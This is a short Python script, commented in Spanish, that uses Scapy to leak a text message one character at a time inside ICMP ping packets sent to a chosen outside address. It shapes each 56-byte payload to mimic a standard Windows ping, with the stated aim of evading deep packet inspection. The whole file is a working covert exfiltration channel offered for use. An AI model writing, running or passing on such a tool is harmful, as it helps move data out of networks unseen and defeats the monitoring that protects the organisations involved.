import os
import sys
import time
import struct
import logging

# Suprimir logs de advertencia de Scapy al iniciar
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

try:
    from scapy.all import IP, ICMP, Raw, send
except ImportError:
    print("Error: Scapy no está instalado. Ejecute 'pip install scapy'", file=sys.stderr)
    sys.exit(1)

def send_covert_icmp(message: str, target_ip: str = "8.8.8.8"):
    """
    Inyecta caracteres dentro del payload ICMP Echo Request (56 bytes)
    emulando la estructura estándar de Windows para evasión DPI.
    """
    icmp_id = os.getpid() & 0xFFFF
    ip_id = 1000

    for seq_num, char in enumerate(message, start=1):
        # 1. Offset 0x00 a 0x07: Timestamp simulado (8 bytes little-endian)
        timestamp = struct.pack("<II", int(time.time()), 0)

        # 2. Offset 0x08: Carácter individual (1 byte)
        char_byte = char.encode("latin-1", errors="replace")[:1]

        # 3. Offset 0x09 a 0x0F: Padding nulo (7 bytes)
        null_padding = b"\x00" * 7

        # 4. Offset 0x10 a 0x37: Secuencia fija estándar (40 bytes: 0x10 hasta 0x37)
        standard_seq = bytes(range(0x10, 0x38))

        # Payload total: 8 + 1 + 7 + 40 = 56 bytes
        payload = timestamp + char_byte + null_padding + standard_seq

        # Construcción del paquete IP/ICMP
        packet = (
            IP(dst=target_ip, id=ip_id) /
            ICMP(type=8, code=0, id=icmp_id, seq=seq_num) /
            Raw(load=payload)
        )

        send(packet, verbose=False)
        print("Sent 1 packets.")

        ip_id = (ip_id + 1) & 0xFFFF
        time.sleep(0.5)

def main():
    if len(sys.argv) < 2:
        print("Uso: python pingv4.py <texto_cifrado> [ip_destino]", file=sys.stderr)
        sys.exit(1)

    message = sys.argv[1]
    target_ip = sys.argv[2] if len(sys.argv) >= 3 else "8.8.8.8"

    try:
        send_covert_icmp(message, target_ip)
    except PermissionError:
        print("Error: Se requieren permisos de Administrador para enviar paquetes RAW.", file=sys.stderr)
        sys.exit(1)
    except KeyboardInterrupt:
        print("\nTransmisión cancelada por el usuario.")
        sys.exit(0)

if __name__ == "__main__":
    main()